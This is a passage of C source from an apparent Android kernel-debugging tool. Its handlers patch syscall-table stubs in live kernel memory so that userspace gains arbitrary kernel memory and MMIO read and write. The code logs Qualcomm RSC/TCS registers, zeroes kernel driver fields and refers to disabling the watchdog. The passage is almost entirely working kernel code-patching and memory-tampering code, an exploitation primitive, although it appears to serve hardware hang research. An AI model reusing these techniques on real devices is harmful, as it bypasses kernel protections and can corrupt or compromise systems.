                                pre = "[RSC] tcs";
                                while (*pre) ob[on++] = *pre++;
                                ob[on++] = (char)('0' + m);
                                ob[on++] = ':';
                                for (int ri = 0; ri < 5; ri++) {
                                    uint64_t a = tcs_base + REGS[ri] + (uint64_t)672 * (uint64_t)m;
                                    for (int i = 0; i < 4; i++) mb[i] = 0xCC;
                                    syscall(nio, (void *)scratch, (void *)a, (size_t)4);
                                    syscall(nmem, mb, (void *)scratch, (size_t)4);
                                    ob[on++] = ' ';
                                    on += hx8(ob + on, mb[3]); on += hx8(ob + on, mb[2]);
                                    on += hx8(ob + on, mb[1]); on += hx8(ob + on, mb[0]);
                                }
                                ob[on++] = '\n';
                                syscall(SYS_write, 1, ob, on);
                            }
                            /* DRV_PRNT_CHLD_CONFIG */
                            on = 0;
                            pre = "[RSC] cfg=";
                            while (*pre) ob[on++] = *pre++;
                            for (int i = 0; i < 4; i++) mb[i] = 0xCC;
                            syscall(nio, (void *)scratch, (void *)(rsc_base + 0x0C), (size_t)4);
                            syscall(nmem, mb, (void *)scratch, (size_t)4);
                            on += hx8(ob + on, mb[3]); on += hx8(ob + on, mb[2]);
                            on += hx8(ob + on, mb[1]); on += hx8(ob + on, mb[0]);
                            ob[on++] = '\n';
                            syscall(SYS_write, 1, ob, on);
                        }
                        for (int k = 0; k < inst; k++) {
                            uint64_t sp = (stubs[k] - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            if (sp >= LO && sp + 16 <= HI) {
                                volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                                for (int i = 0; i < 4; i++) sw[i] = saved[k][i];
                                cache_maint_el0((void *)sw, 16);
                            }
                        }
                        l1i_capacity_evict();
                        { const char *e2 = "[RSCDUMP] restored\n";
                          syscall(SYS_write, 1, e2, 20); }
                        log_fsync();
                    }
                    if (strstr(pb, "MEMREAD") || strstr(pb, "MEMWRITE")) {
                        /* MEMREAD  <tbl_va> <nr> <copy_to_user_va>   <read_va> <n>
                         * MEMWRITE <tbl_va> <nr> <copy_from_user_va> <write_va> <hex_words...>
                         * Install the stub, use it, restore it, all inside this one call:
                         * sys_call_table is a live dispatch table, so leaving an entry patched for long
                         * lets other processes run the wrong function. */
                        int isw = (strstr(pb, "MEMWRITE") != 0);
                        char *q = strstr(pb, isw ? "MEMWRITE" : "MEMREAD") + (isw ? 8 : 7);
                        uint64_t tbl = strtoull(q, &q, 16);
                        int nr = (int)strtoul(q, &q, 10);
                        uint64_t tgt = strtoull(q, &q, 16);
                        while (*q == ' ') q++;
                        uint64_t va = strtoull(q, &q, 16);
                        const uint64_t LO = 0x80000000ULL, HI = 0x80000000ULL + 0xC0000000ULL;
                        char ob[4096]; int on = 0;
                        uint64_t ent_pa = (tbl + (uint64_t)nr * 8 - g_delta)
                                          - 0xffffffc010000000ULL + 0xa0000000ULL;
                        uint64_t stub = 0;
                        if (g_lb && g_delta && ent_pa >= LO && ent_pa + 8 <= HI) {
                            volatile uint32_t *ep = (volatile uint32_t *)(void *)(g_lb + (ent_pa - LO));
                            stub = (uint64_t)ep[0] | ((uint64_t)ep[1] << 32);
                        }
                        uint64_t sp = (stub - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                        int64_t d = (int64_t)tgt - (int64_t)(stub + 12);
                        if (!stub || !tgt || sp < LO || sp + 16 > HI ||
                            d < -134217728LL || d > 134217724LL) {
                            const char *e2 = "[MEM] rejected (stub/target out of range)\n";
                            syscall(SYS_write, 1, e2, 44);
                        } else {
                            volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                            uint32_t saved[4];
                            for (int i = 0; i < 4; i++) saved[i] = sw[i];
                            uint32_t w[4];
                            w[0] = 0xF9400401u; w[1] = 0xF9400802u; w[2] = 0xF9400000u;
                            w[3] = 0x14000000u | ((uint32_t)((d >> 2) & 0x3FFFFFF));
                            for (int i = 0; i < 4; i++) sw[i] = w[i];
                            cache_maint_el0((void *)sw, 16);
                            l1i_capacity_evict();
                            static uint8_t mb[4096];
                            long r = 0;
                            int n = 0;
                            if (!isw) {
                                while (*q == ' ') q++;
                                n = atoi(q);
                                if (n < 1 || n > 4096) n = 64;
                                for (int i = 0; i < n; i++) mb[i] = 0xCC;
                                r = syscall(nr, mb, (void *)va, (size_t)n);
                            } else {
                                int nb = 0;
                                while (nb + 4 <= (int)sizeof(mb)) {
                                    while (*q == ' ' || *q == '\t') q++;
                                    if (*q == 0 || *q == '\n' || *q == '\r') break;
                                    uint32_t wv = (uint32_t)strtoull(q, &q, 16);
                                    mb[nb++] = (uint8_t)(wv & 0xFF);
                                    mb[nb++] = (uint8_t)((wv >> 8) & 0xFF);
                                    mb[nb++] = (uint8_t)((wv >> 16) & 0xFF);
                                    mb[nb++] = (uint8_t)((wv >> 24) & 0xFF);
                                }
                                n = nb;
                                r = (nb > 0) ? syscall(nr, (void *)va, mb, (size_t)nb) : -1;
                            }
                            for (int i = 0; i < 4; i++) sw[i] = saved[i];
                            cache_maint_el0((void *)sw, 16);
                            l1i_capacity_evict();
                            on = 0;
                            const char *pre = isw ? "[MEMWRITE] va=" : "[MEMREAD] va=";
                            while (*pre) ob[on++] = *pre++;
                            on += hx32(ob + on, (uint32_t)(va >> 32));
                            on += hx32(ob + on, (uint32_t)va);
                            pre = " n=";
                            while (*pre) ob[on++] = *pre++;
                            { int v = n; char t[8]; int tn = 0;
                              if (v == 0) t[tn++] = '0';
                              while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                              while (tn > 0) ob[on++] = t[--tn]; }
                            pre = " ret=";
                            while (*pre) ob[on++] = *pre++;
                            { long v = r; int neg = (v < 0); if (neg) v = -v; char t[24]; int tn = 0;
                              if (v == 0) t[tn++] = '0';
                              while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                              if (neg) t[tn++] = '-';
                              while (tn > 0) ob[on++] = t[--tn]; }
                            ob[on++] = '\n';
                            syscall(SYS_write, 1, ob, on);
                            if (!isw) {
                                for (int i2 = 0; i2 < n; i2 += 16) {
                                    on = 0;
                                    on += hx32(ob + on, (uint32_t)((va + (uint64_t)i2) >> 32));
                                    on += hx32(ob + on, (uint32_t)(va + (uint64_t)i2));
                                    ob[on++] = ':';
                                    for (int j2 = 0; j2 < 16 && i2 + j2 < n; j2++) {
                                        ob[on++] = ' ';
                                        on += hx8(ob + on, mb[i2 + j2]);
                                    }
                                    ob[on++] = ' ';
                                    ob[on++] = '|';
                                    for (int j2 = 0; j2 < 16 && i2 + j2 < n; j2++) {
                                        uint8_t c = mb[i2 + j2];
                                        ob[on++] = (char)((c >= 32 && c < 127) ? c : '.');
                                    }
                                    ob[on++] = '|';
                                    ob[on++] = '\n';
                                    syscall(SYS_write, 1, ob, on);
                                }
                            }
                        }
                        log_fsync();
                    }
                    if (strstr(pb, "MEMIORD")) {
                        /* MEMIORD <tbl> <nr_io> <nr_mem> <mfi> <ctu> <scratch_kva> <ioremap_va> <n>.
                         * Installs nr_io as __memcpy_fromio and nr_mem as __arch_copy_to_user, reads
                         * MMIO into a kernel buffer, copies it out, then restores both. scratch_kva
                         * must be writable kernel memory; MMIO cannot be copy_to_user'd. */
                        char *q = strstr(pb, "MEMIORD") + 7;
                        uint64_t tbl = strtoull(q, &q, 16);
                        int nrio = (int)strtoul(q, &q, 10);
                        int nrmem = (int)strtoul(q, &q, 10);
                        uint64_t mfi = strtoull(q, &q, 16);
                        uint64_t ctu = strtoull(q, &q, 16);
                        uint64_t scr = strtoull(q, &q, 16);
                        uint64_t iov = strtoull(q, &q, 16);
                        while (*q == ' ') q++;
                        int n = atoi(q);
                        if (n < 1 || n > 4096) n = 4;
                        /* The two entries must differ: the same number sends both stubs to one slot,
                         * and the read then returns the wrong value without any error. */
                        int bad_nr = (nrio == nrmem);
                        if (bad_nr)
                            L("[MEMIORD] refused: nr_io equals nr_mem (%d); the two stubs would share one slot\n", nrio);
                        const uint64_t LO = 0x80000000ULL, HI = 0x80000000ULL + 0xC0000000ULL;
                        int nrs[2] = { nrio, nrmem };
                        uint64_t tgts[2] = { mfi, ctu };
                        uint64_t stubs[2]; uint32_t saved[2][4]; int inst = 0;
                        for (int k = 0; k < 2; k++) {
                            uint64_t ent_pa = (tbl + (uint64_t)nrs[k] * 8 - g_delta)
                                              - 0xffffffc010000000ULL + 0xa0000000ULL;
                            uint64_t stub = 0;
                            if (g_lb && g_delta && ent_pa >= LO && ent_pa + 8 <= HI) {
                                volatile uint32_t *ep = (volatile uint32_t *)(void *)(g_lb + (ent_pa - LO));
                                stub = (uint64_t)ep[0] | ((uint64_t)ep[1] << 32);
                            }
                            if (!stub || !tgts[k]) continue;
                            uint64_t sp = (stub - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            int64_t d = (int64_t)tgts[k] - (int64_t)(stub + 12);
                            if (sp < LO || sp + 16 > HI || d < -134217728LL || d > 134217724LL) continue;
                            volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                            for (int i = 0; i < 4; i++) saved[inst][i] = sw[i];
                            uint32_t w[4];
                            w[0] = 0xF9400401u; w[1] = 0xF9400802u; w[2] = 0xF9400000u;
                            w[3] = 0x14000000u | ((uint32_t)((d >> 2) & 0x3FFFFFF));
                            for (int i = 0; i < 4; i++) sw[i] = w[i];
                            cache_maint_el0((void *)sw, 16);
                            stubs[inst] = stub;
                            inst++;
                        }
                        l1i_capacity_evict();
                        char ob[4096]; int on = 0;
                        static uint8_t mb[4096];
                        long r1 = -1, r2 = -1;
                        if (inst == 2 && !bad_nr) {
                            for (int i = 0; i < n; i++) mb[i] = 0xCC;
                            r1 = syscall(nrio, (void *)scr, (void *)iov, (size_t)n);
                            r2 = syscall(nrmem, mb, (void *)scr, (size_t)n);
                        }
                        for (int k = 0; k < inst; k++) {
                            uint64_t sp = (stubs[k] - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            if (sp >= LO && sp + 16 <= HI) {
                                volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                                for (int i = 0; i < 4; i++) sw[i] = saved[k][i];
                                cache_maint_el0((void *)sw, 16);
                            }
                        }
                        l1i_capacity_evict();
                        const char *pre = "[MEMIORD] iova=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(iov >> 32));
                        on += hx32(ob + on, (uint32_t)iov);
                        pre = " inst=";
                        while (*pre) ob[on++] = *pre++;
                        ob[on++] = (char)('0' + inst);
                        pre = " r1=";
                        while (*pre) ob[on++] = *pre++;
                        { long v = r1; int neg = (v < 0); if (neg) v = -v; char t[24]; int tn = 0;
                          if (v == 0) t[tn++] = '0';
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          if (neg) t[tn++] = '-';
                          while (tn > 0) ob[on++] = t[--tn]; }
                        pre = " r2=";
                        while (*pre) ob[on++] = *pre++;
                        { long v = r2; int neg = (v < 0); if (neg) v = -v; char t[24]; int tn = 0;
                          if (v == 0) t[tn++] = '0';
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          if (neg) t[tn++] = '-';
                          while (tn > 0) ob[on++] = t[--tn]; }
                        pre = " val=";
                        while (*pre) ob[on++] = *pre++;
                        for (int i = 0; i < n && i < 16; i++) on += hx8(ob + on, mb[i]);
                        pre = "\n";
                        while (*pre) ob[on++] = *pre++;
                        syscall(SYS_write, 1, ob, on);
                        log_fsync();
                    }
                    if (strstr(pb, "RSCFX")) {
                        /* RSCFX <tbl> <nr_read> <nr_write> <ctu> <cfu> <rsc_drv_va>
                        Read and write stubs need different syscall numbers: one number puts both stubs in
                        the same table slot, the second install overwrites the first, and the read turns
                        into a write of 0xCC into drv+8/drv+16 that corrupts rsc_drv itself.
                        RSC MMIO is only reachable 32 bits at a time through copy_to_user/copy_from_user,
                        never __memcpy_fromio. Zeroing the slot fields in DRAM makes tcs_invalidate return
                        early and skip its MMIO read-back. */
                        char *q = strstr(pb, "RSCFX") + 5;
                        uint64_t tbl = strtoull(q, &q, 16);
                        int nrrd = (int)strtoul(q, &q, 10);
                        int nrwr = (int)strtoul(q, &q, 10);
                        uint64_t ctu = strtoull(q, &q, 16);
                        uint64_t cfu = strtoull(q, &q, 16);
                        uint64_t rsc_drv_va = strtoull(q, &q, 16);
                        const uint64_t LO = 0x80000000ULL, HI = 0x80000000ULL + 0xC0000000ULL;
                        char ob[4096]; int on = 0;
                        int nrs[2] = { nrrd, nrwr };
                        uint64_t stubs[2]; uint32_t saved[2][4]; int inst = 0;
                        uint64_t tgts[2] = { ctu, cfu };
                        for (int k = 0; k < 2; k++) {
                            uint64_t ent_pa = (tbl + (uint64_t)nrs[k] * 8 - g_delta)
                                              - 0xffffffc010000000ULL + 0xa0000000ULL;
                            uint64_t stub = 0;
                            if (g_lb && g_delta && ent_pa >= LO && ent_pa + 8 <= HI) {
                                volatile uint32_t *ep = (volatile uint32_t *)(void *)(g_lb + (ent_pa - LO));
                                stub = (uint64_t)ep[0] | ((uint64_t)ep[1] << 32);
                            }
                            if (!stub || !tgts[k]) continue;
                            uint64_t sp = (stub - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            int64_t d = (int64_t)tgts[k] - (int64_t)(stub + 12);
                            if (sp < LO || sp + 16 > HI || d < -134217728LL || d > 134217724LL) continue;
                            volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                            for (int i = 0; i < 4; i++) saved[inst][i] = sw[i];
                            uint32_t w[4];
                            w[0] = 0xF9400401u; w[1] = 0xF9400802u; w[2] = 0xF9400000u;
                            w[3] = 0x14000000u | ((uint32_t)((d >> 2) & 0x3FFFFFF));
                            for (int i = 0; i < 4; i++) sw[i] = w[i];
                            cache_maint_el0((void *)sw, 16);
                            stubs[inst] = stub;
                            inst++;
                        }
                        l1i_capacity_evict();
                        static uint8_t mb[256];
                        /* rsc_drv lives in the module image's .bss; rsc_drv_va is its VA, read through the window. */
                        uint64_t drv = 0;
                        {
                            uint64_t dp = (rsc_drv_va - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            if (g_lb && g_delta && dp >= LO && dp + 8 <= HI) {
                                volatile uint32_t *dpw = (volatile uint32_t *)(void *)(g_lb + (dp - LO));
                                drv = (uint64_t)dpw[0] | ((uint64_t)dpw[1] << 32);
                            }
                        }
                        uint64_t rsc_base = 0, tcs_base = 0;
                        if (inst == 2 && drv) {
                            for (int i = 0; i < 8; i++) mb[i] = 0;
                            syscall(nrrd, mb, (void *)(drv + 8), (size_t)8);
                            for (int i = 0; i < 8; i++) rsc_base |= (uint64_t)mb[i] << (8 * i);
                            for (int i = 0; i < 8; i++) mb[i] = 0;
                            syscall(nrrd, mb, (void *)(drv + 16), (size_t)8);
                            for (int i = 0; i < 8; i++) tcs_base |= (uint64_t)mb[i] << (8 * i);
                        }
                        on = 0;
                        const char *pre = "[RSCFX] inst=";
                        while (*pre) ob[on++] = *pre++;
                        ob[on++] = (char)('0' + inst);
                        pre = " drv=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(drv >> 32)); on += hx32(ob + on, (uint32_t)drv);
                        pre = " base=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(rsc_base >> 32)); on += hx32(ob + on, (uint32_t)rsc_base);
                        pre = " tcs=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(tcs_base >> 32)); on += hx32(ob + on, (uint32_t)tcs_base);
                        ob[on++] = '\n';
                        syscall(SYS_write, 1, ob, on);
                        if (inst == 2 && drv && tcs_base) {
                            /* MMIO is readable only 32 bits at a time, so copy_to_user is called with n=4. */
                            for (int m = 2; m <= 7; m++) {
                                on = 0;
                                pre = "[RSCRG] tcs";
                                while (*pre) ob[on++] = *pre++;
                                ob[on++] = (char)('0' + m);
                                ob[on++] = ':';
                                const uint32_t rg[3] = { 0x10, 0x14, 0x1c };
                                for (int ri = 0; ri < 3; ri++) {
                                    uint64_t a = tcs_base + rg[ri] + (uint64_t)672 * (uint64_t)m;
                                    for (int i = 0; i < 4; i++) mb[i] = 0xCC;
                                    syscall(nrrd, mb, (void *)a, (size_t)4);
                                    ob[on++] = ' ';
                                    on += hx8(ob + on, mb[3]); on += hx8(ob + on, mb[2]);
                                    on += hx8(ob + on, mb[1]); on += hx8(ob + on, mb[0]);
                                }
                                ob[on++] = '\n';
                                syscall(SYS_write, 1, ob, on);
                            }
                            const uint64_t S0 = drv + 0x68;   /* tcs[0] SLEEP */
                            const uint64_t S1 = drv + 0xb0;   /* tcs[1] WAKE  */
                            uint64_t v0 = 0, v1 = 0;
                            for (int i = 0; i < 8; i++) mb[i] = 0xCC;
                            syscall(nrrd, mb, (void *)S0, (size_t)8);
                            for (int i = 0; i < 8; i++) v0 |= (uint64_t)mb[i] << (8 * i);
                            for (int i = 0; i < 8; i++) mb[i] = 0xCC;
                            syscall(nrrd, mb, (void *)S1, (size_t)8);
                            for (int i = 0; i < 8; i++) v1 |= (uint64_t)mb[i] << (8 * i);
                            on = 0;
                            pre = "[RSCFX] slots before: tcs0=";
                            while (*pre) ob[on++] = *pre++;
                            on += hx32(ob + on, (uint32_t)(v0 >> 32)); on += hx32(ob + on, (uint32_t)v0);
                            pre = " tcs1=";
                            while (*pre) ob[on++] = *pre++;
                            on += hx32(ob + on, (uint32_t)(v1 >> 32)); on += hx32(ob + on, (uint32_t)v1);
                            ob[on++] = '\n';
                            syscall(SYS_write, 1, ob, on);
                            /* Zero the slots through the installed cfu stub: stub[1] is cfu. */
                            for (int i = 0; i < 8; i++) mb[i] = 0;
                            syscall(nrwr, (void *)S0, mb, (size_t)8);
                            syscall(nrwr, (void *)S1, mb, (size_t)8);
                            v0 = 0; v1 = 0;
                            for (int i = 0; i < 8; i++) mb[i] = 0xCC;
                            syscall(nrrd, mb, (void *)S0, (size_t)8);
                            for (int i = 0; i < 8; i++) v0 |= (uint64_t)mb[i] << (8 * i);
                            for (int i = 0; i < 8; i++) mb[i] = 0xCC;
                            syscall(nrrd, mb, (void *)S1, (size_t)8);
                            for (int i = 0; i < 8; i++) v1 |= (uint64_t)mb[i] << (8 * i);
                            on = 0;
                            pre = "[RSCFX] slots after : tcs0=";
                            while (*pre) ob[on++] = *pre++;
                            on += hx32(ob + on, (uint32_t)(v0 >> 32)); on += hx32(ob + on, (uint32_t)v0);
                            pre = " tcs1=";
                            while (*pre) ob[on++] = *pre++;
                            on += hx32(ob + on, (uint32_t)(v1 >> 32)); on += hx32(ob + on, (uint32_t)v1);
                            ob[on++] = '\n';
                            syscall(SYS_write, 1, ob, on);
                        }
                        for (int k = 0; k < inst; k++) {
                            uint64_t sp = (stubs[k] - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            if (sp >= LO && sp + 16 <= HI) {
                                volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                                for (int i = 0; i < 4; i++) sw[i] = saved[k][i];
                                cache_maint_el0((void *)sw, 16);
                            }
                        }
                        l1i_capacity_evict();
                        { const char *e2 = "[RSCFX] restored\n";
                          syscall(SYS_write, 1, e2, 17); }
                        log_fsync();
                    }
                    if (strstr(pb, "RSCLOOP")) {
                        /* RSCLOOP <tbl> <nr_read> <ctu> <rsc_drv_va> <seconds>
                        Sample the RSC state into /data/local/tmp/rsc.log. Every record is fsync'ed, so
                        the last samples before a hard hang survive on disk; the watchdog disables the bite
                        with KCPATCH, so a hang can be caught in place instead of turning into a restart. */
                        char *q = strstr(pb, "RSCLOOP") + 7;
                        uint64_t tbl = strtoull(q, &q, 16);
                        int nrrd = (int)strtoul(q, &q, 10);
                        uint64_t ctu = strtoull(q, &q, 16);
                        uint64_t rsc_drv_va = strtoull(q, &q, 16);
                        int secs = atoi(q);
                        if (secs < 5 || secs > 600) secs = 120;
                        const uint64_t LO = 0x80000000ULL, HI = 0x80000000ULL + 0xC0000000ULL;
                        uint64_t stub = 0, sp = 0; uint32_t saved[4];
                        {
                            uint64_t ent_pa = (tbl + (uint64_t)nrrd * 8 - g_delta)
                                              - 0xffffffc010000000ULL + 0xa0000000ULL;
                            if (g_lb && g_delta && ent_pa >= LO && ent_pa + 8 <= HI) {
                                volatile uint32_t *ep = (volatile uint32_t *)(void *)(g_lb + (ent_pa - LO));
                                stub = (uint64_t)ep[0] | ((uint64_t)ep[1] << 32);
                            }
                            if (stub && ctu) {
                                sp = (stub - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                                int64_t d = (int64_t)ctu - (int64_t)(stub + 12);
                                if (sp >= LO && sp + 16 <= HI && d >= -134217728LL && d <= 134217724LL) {
                                    volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                                    for (int i = 0; i < 4; i++) saved[i] = sw[i];
                                    uint32_t w[4];
                                    w[0] = 0xF9400401u; w[1] = 0xF9400802u; w[2] = 0xF9400000u;
                                    w[3] = 0x14000000u | ((uint32_t)((d >> 2) & 0x3FFFFFF));
                                    for (int i = 0; i < 4; i++) sw[i] = w[i];
                                    cache_maint_el0((void *)sw, 16); l1i_capacity_evict();
                                } else stub = 0;
                            } else stub = 0;
                        }
                        uint64_t drv = 0;
                        {
                            uint64_t dp = (rsc_drv_va - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            if (g_lb && g_delta && dp >= LO && dp + 8 <= HI) {
                                volatile uint32_t *dpw = (volatile uint32_t *)(void *)(g_lb + (dp - LO));
                                drv = (uint64_t)dpw[0] | ((uint64_t)dpw[1] << 32);
                            }
                        }
                        if (stub && drv) {
                            static uint8_t mb[64];
                            int fd = open("/data/local/tmp/rsc.log", O_WRONLY | O_CREAT | O_TRUNC, 0666);
                            char ob[256];
                            for (int it = 0; it < secs * 4; it++) {
                                uint64_t rsc_base = 0, tcs_base = 0;
                                for (int i = 0; i < 8; i++) mb[i] = 0;
                                syscall(nrrd, mb, (void *)(drv + 8), (size_t)8);
                                for (int i = 0; i < 8; i++) rsc_base |= (uint64_t)mb[i] << (8 * i);
                                for (int i = 0; i < 8; i++) mb[i] = 0;
                                syscall(nrrd, mb, (void *)(drv + 16), (size_t)8);
                                for (int i = 0; i < 8; i++) tcs_base |= (uint64_t)mb[i] << (8 * i);
                                uint32_t irqs = 0, ctl0 = 0, en0 = 0, st0 = 0, ctl1 = 0, en1 = 0, st1 = 0, use = 0;
                                if (rsc_base && tcs_base) {
                                    for (int i = 0; i < 4; i++) mb[i] = 0;
                                    syscall(nrrd, mb, (void *)(rsc_base + 0x04), (size_t)4);
                                    irqs = (uint32_t)mb[0] | ((uint32_t)mb[1] << 8) | ((uint32_t)mb[2] << 16) | ((uint32_t)mb[3] << 24);
                                    const uint32_t rg[3] = { 0x14, 0x1c, 0x18 };
                                    uint32_t *out0[3] = { &ctl0, &en0, &st0 };
                                    uint32_t *out1[3] = { &ctl1, &en1, &st1 };
                                    for (int ri = 0; ri < 3; ri++) {
                                        for (int i = 0; i < 4; i++) mb[i] = 0;
                                        syscall(nrrd, mb, (void *)(tcs_base + rg[ri]), (size_t)4);
                                        *out0[ri] = (uint32_t)mb[0] | ((uint32_t)mb[1] << 8) | ((uint32_t)mb[2] << 16) | ((uint32_t)mb[3] << 24);
                                        for (int i = 0; i < 4; i++) mb[i] = 0;
                                        syscall(nrrd, mb, (void *)(tcs_base + rg[ri] + 672), (size_t)4);
                                        *out1[ri] = (uint32_t)mb[0] | ((uint32_t)mb[1] << 8) | ((uint32_t)mb[2] << 16) | ((uint32_t)mb[3] << 24);
                                    }
                                    for (int i = 0; i < 4; i++) mb[i] = 0;
                                    syscall(nrrd, mb, (void *)(drv + 0x148), (size_t)4);
                                    use = (uint32_t)mb[0] | ((uint32_t)mb[1] << 8) | ((uint32_t)mb[2] << 16) | ((uint32_t)mb[3] << 24);
                                }
                                int on = 0;
                                on += hx32(ob + on, (uint32_t)it);
                                ob[on++] = ' ';
                                on += hx32(ob + on, irqs); ob[on++] = ' ';
                                on += hx32(ob + on, use);  ob[on++] = ' ';
                                on += hx32(ob + on, ctl0); ob[on++] = ' ';
                                on += hx32(ob + on, en0);  ob[on++] = ' ';
                                on += hx32(ob + on, st0);  ob[on++] = ' ';
                                on += hx32(ob + on, ctl1); ob[on++] = ' ';
                                on += hx32(ob + on, en1);  ob[on++] = ' ';
                                on += hx32(ob + on, st1);
                                ob[on++] = '\n';
                                if (fd >= 0) { ssize_t wr = write(fd, ob, on); (void)wr; safe_fsync(fd); }
                                struct timespec q2 = { 0, 250000000 };
                                nanosleep(&q2, NULL);
                            }
                            if (fd >= 0) close(fd);
                            { const char *e2 = "[RSCLOOP] done\n";
                              syscall(SYS_write, 1, e2, 16); }
                            {
                                volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                                for (int i = 0; i < 4; i++) sw[i] = saved[i];
                                cache_maint_el0((void *)sw, 16); l1i_capacity_evict();
                            }
                        } else {
                            const char *e2 = "[RSCLOOP] rejected (stub/drv)\n";
                            syscall(SYS_write, 1, e2, 29);
                        }
                        log_fsync();
                    }
                    if (strstr(pb, "RSCRN")) {
                        /* RSCRN <tbl> <nr_read> <ctu> <rsc_drv_va> <seconds>
                        One second per sample: reading RSC MMIO every 0.25s stalls the target. One command
                        runs the whole sequence, because the MTP switch drops adb and no external command
                        can follow it. */
                        char *q = strstr(pb, "RSCRN") + 5;
                        uint64_t tbl = strtoull(q, &q, 16);
                        int nrrd = (int)strtoul(q, &q, 10);
                        uint64_t ctu = strtoull(q, &q, 16);
                        uint64_t rsc_drv_va = strtoull(q, &q, 16);
                        int secs = atoi(q);
                        if (secs < 20 || secs > 600) secs = 120;
                        const uint64_t LO = 0x80000000ULL, HI = 0x80000000ULL + 0xC0000000ULL;
                        uint64_t stub = 0, sp = 0; uint32_t saved[4];
                        {
                            uint64_t ent_pa = (tbl + (uint64_t)nrrd * 8 - g_delta)
                                              - 0xffffffc010000000ULL + 0xa0000000ULL;
                            if (g_lb && g_delta && ent_pa >= LO && ent_pa + 8 <= HI) {
                                volatile uint32_t *ep = (volatile uint32_t *)(void *)(g_lb + (ent_pa - LO));
                                stub = (uint64_t)ep[0] | ((uint64_t)ep[1] << 32);
                            }
                            if (stub && ctu) {
                                sp = (stub - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                                int64_t d = (int64_t)ctu - (int64_t)(stub + 12);
                                if (sp >= LO && sp + 16 <= HI && d >= -134217728LL && d <= 134217724LL) {
                                    volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                                    for (int i = 0; i < 4; i++) saved[i] = sw[i];
                                    uint32_t w[4];
                                    w[0] = 0xF9400401u; w[1] = 0xF9400802u; w[2] = 0xF9400000u;
                                    w[3] = 0x14000000u | ((uint32_t)((d >> 2) & 0x3FFFFFF));
                                    for (int i = 0; i < 4; i++) sw[i] = w[i];
                                    cache_maint_el0((void *)sw, 16); l1i_capacity_evict();
                                } else stub = 0;
                            } else stub = 0;
                        }
                        uint64_t drv = 0;
                        {
                            uint64_t dp = (rsc_drv_va - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            if (g_lb && g_delta && dp >= LO && dp + 8 <= HI) {
                                volatile uint32_t *dpw = (volatile uint32_t *)(void *)(g_lb + (dp - LO));
                                drv = (uint64_t)dpw[0] | ((uint64_t)dpw[1] << 32);
                            }
                        }
                        if (stub && drv) {
                            static uint8_t mb[64];
                            int fd = open("/data/local/tmp/rsc.log", O_WRONLY | O_CREAT | O_TRUNC, 0666);
                            char ob[256];
                            const char *hdr = "it irqs use ctl0 en0 st0 ctl1 en1 st1\n";
                            if (fd >= 0) { ssize_t wr = write(fd, hdr, strlen(hdr)); (void)wr; safe_fsync(fd); }
                            for (int it = 0; it < secs; it++) {
                                if (it == 5) {
                                    /* Full MTP switch, replicating init.asus.usb.rc. */
                                    int rc = system(
                                        "cd /config/usb_gadget/g1 && "
                                        "echo none > UDC && "
                                        "rm -f configs/b.1/f1 configs/b.1/f2 && "
                                        "echo 0x0B05 > idVendor && "
                                        "echo 0x7773 > idProduct && "
                                        "ln -s /config/usb_gadget/g1/functions/ffs.mtp configs/b.1/f1 && "
                                        "ln -s /config/usb_gadget/g1/functions/ffs.adb configs/b.1/f2 && "
                                        "echo a600000.dwc3 > UDC");
                                    if (fd >= 0) {
                                        int on = 0;
                                        const char *t2 = "[MTP] seq_rc=";
                                        while (*t2) ob[on++] = *t2++;
                                        { int v = rc; int neg = (v < 0); if (neg) v = -v; char t[16]; int tn = 0;
                                          if (v == 0) t[tn++] = '0';
                                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                                          if (neg) t[tn++] = '-';
                                          while (tn > 0) ob[on++] = t[--tn]; }
                                        ob[on++] = '\n';
                                        ssize_t wr = write(fd, ob, on); (void)wr; safe_fsync(fd);
                                    }
                                }
                                uint64_t rsc_base = 0, tcs_base = 0;
                                for (int i = 0; i < 8; i++) mb[i] = 0;
                                syscall(nrrd, mb, (void *)(drv + 8), (size_t)8);
                                for (int i = 0; i < 8; i++) rsc_base |= (uint64_t)mb[i] << (8 * i);
                                for (int i = 0; i < 8; i++) mb[i] = 0;
                                syscall(nrrd, mb, (void *)(drv + 16), (size_t)8);
                                for (int i = 0; i < 8; i++) tcs_base |= (uint64_t)mb[i] << (8 * i);
                                uint32_t irqs = 0, ctl0 = 0, en0 = 0, st0 = 0, ctl1 = 0, en1 = 0, st1 = 0, use = 0;
                                if (rsc_base && tcs_base) {
                                    for (int i = 0; i < 4; i++) mb[i] = 0;
                                    syscall(nrrd, mb, (void *)(rsc_base + 0x04), (size_t)4);
